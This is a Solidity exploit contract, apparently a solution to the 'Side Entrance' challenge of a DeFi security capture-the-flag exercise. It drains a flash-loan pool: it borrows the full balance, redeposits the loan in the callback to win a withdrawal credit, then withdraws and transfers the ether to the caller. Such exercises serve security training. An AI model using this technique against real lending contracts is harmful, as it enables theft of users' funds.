// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceHack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    // The flashloan callback.
    function execute() external payable override {
        // Deposit the loan back into the pool, but under our name.
        pool.deposit{value: msg.value}();
    }

    // Necessary for the withdrawal from the pool.
    receive() external payable {}
}
